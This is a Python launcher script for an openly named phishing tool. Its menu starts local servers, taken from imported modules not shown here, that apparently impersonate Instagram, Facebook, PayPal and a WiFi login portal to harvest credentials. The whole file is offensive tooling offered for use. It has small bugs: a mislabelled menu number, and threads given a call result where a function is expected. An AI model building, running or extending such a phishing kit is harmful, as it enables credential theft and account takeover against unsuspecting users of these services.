import pyfiglet

from portals.Instagram.assets import api as instagramAPI
from portals.Facebook.assets import api as facebookAPI
from portals.PayPal.assets import api as paypalAPI
from portals.GRA.assets import api as graAPI

import threading

ascii_banner = pyfiglet.figlet_format("FIN - Phishing")

print("\n")

print(ascii_banner)

print(" " + "=" * 65)
print(" FIN - Phishing Tool")
print(" by @xbze3 on GitHub")
print(" " + "-" * 65)

print(" [0] Exit")
print(" [1] Instagram")
print(" [2] Facebook")
print(" [2] PayPal")
print(" [4] GRA - WiFi")
print(" " + "-" * 65)

def startServerThread(code):
    if code == 1:
        serverThread = threading.Thread(target=instagramAPI.startServer())
        serverThread.daemon = True
        serverThread.start()

    if code == 2:
        serverThread = threading.Thread(target=facebookAPI.startServer())
        serverThread.daemon = True
        serverThread.start()

    if code == 3:
        serverThread = threading.Thread(target=paypalAPI.startServer())
        serverThread.daemon = True
        serverThread.start()

    if code == 4:
        serverThread = threading.Thread(target=graAPI.startServer())
        serverThread.daemon = True
        serverThread.start()

while True:
    command = input("\n FIN: ")
    command = int(command)

    if command == 0:
        print(" \n")
        break

    elif command == 1:
        print("\n")
        startServerThread(1)

    elif command == 2:
        print("\n")
        startServerThread(2)

    elif command == 3:
        print("\n")
        startServerThread(3)

    elif command == 4:
        print("\n")
        startServerThread(4)
